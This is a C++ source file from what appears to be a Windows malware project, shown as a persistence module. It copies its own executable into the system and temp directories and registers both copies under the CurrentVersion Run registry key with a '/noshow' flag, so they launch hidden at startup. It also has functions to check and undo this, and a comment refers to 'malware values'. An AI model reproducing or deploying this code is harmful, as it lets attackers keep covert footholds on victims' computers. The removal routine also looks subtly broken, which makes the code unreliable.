// CU ASTA CICA POT FACE SA SE DESCHIDA ODATA CU PCUL

void SystemStorage::Persistence() {
  // copy value in system
  HMODULE module_handler = GetModuleHandle(NULL);
  char file_path[MAX_PATH];
  char system_path[MAX_PATH];
  char system_path_reg[MAX_PATH] = "\"";
  char tmp_path[MAX_PATH];
  char tmp_path_reg[MAX_PATH] = "\"";

  GetModuleFileName(module_handler, file_path, MAX_PATH);
  GetSystemDirectory(system_path, MAX_PATH);
  strcat(system_path_reg, system_path);
  GetTempPath(MAX_PATH, tmp_path);
  strcat(tmp_path_reg, tmp_path);

  strcat(system_path_reg, ("\\" + appName + ".exe\" /noshow").c_str());
  strcat(system_path, ("\\" + appName + ".exe").c_str());
  CopyFile(file_path, system_path, true);

  strcat(tmp_path_reg, (appName + ".exe\" /noshow").c_str());
  strcat(tmp_path, (appName + ".exe").c_str());
  CopyFile(file_path, tmp_path, true);

  SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
               (appName + "1").c_str(), system_path_reg);
  SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
               (appName + "2").c_str(), tmp_path_reg);
}

void SystemStorage::RemovePersistence() {
  HMODULE module_handler = GetModuleHandle(NULL);
  char file_path[MAX_PATH];
  char tmp_path[MAX_PATH];
  char tmp_path_reg[MAX_PATH] = "\"";

  GetModuleFileName(module_handler, file_path, MAX_PATH);
  GetTempPath(MAX_PATH, tmp_path);
  strcat(tmp_path_reg, tmp_path);

  strcat(tmp_path_reg, (appName + ".exe\" /noshow").c_str());
  strcat(tmp_path, (appName + ".exe").c_str());
  DeleteFile(tmp_path);

  SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
               (appName + "2").c_str(), tmp_path_reg);
  DeleteFile(tmp_path_reg);
}

// verify the existence of malware values created by the persistence function.
bool SystemStorage::CheckPersistence() {
  bool b = false;
  HMODULE module_handler = GetModuleHandle(NULL);
  char system_path[MAX_PATH];
  char file_path[MAX_PATH];
  char tmp_path[MAX_PATH];

  GetModuleFileName(module_handler, file_path, MAX_PATH);
  GetSystemDirectory(system_path, MAX_PATH);
  GetTempPath(MAX_PATH, tmp_path);
  strcat(system_path, ("\\" + appName + ".exe").c_str());
  strcat(tmp_path, (appName + ".exe").c_str());
  std::ifstream fileSys(system_path);
  std::ifstream fileTmp(tmp_path);

  // ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
  if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      (appName + "1").c_str())
             .empty()) &&
       (fileSys.is_open())) ||
      (!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      (appName + "2").c_str())
             .empty()) &&
       (fileTmp.is_open())))
    b = true;
  /*
    if (!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    (appName + "1").c_str()).empty())) MessageBox(NULL, "TRUERegSys", " ", 0);
    //	MessageBox(NULL,
    (LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName
    + "1").c_str())).c_str()), " ", 0); if (fileSys.is_open()) MessageBox(NULL,
    "TRUESYS", " ", 0);
    if(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    (appName + "2").c_str()).empty())) MessageBox(NULL, "TRUETmpReg", " ", 0);
    if(fileTmp.is_open()) MessageBox(NULL, "TRUETMp", " ", 0);
    */

  fileSys.close();
  fileTmp.close();

  return b;
}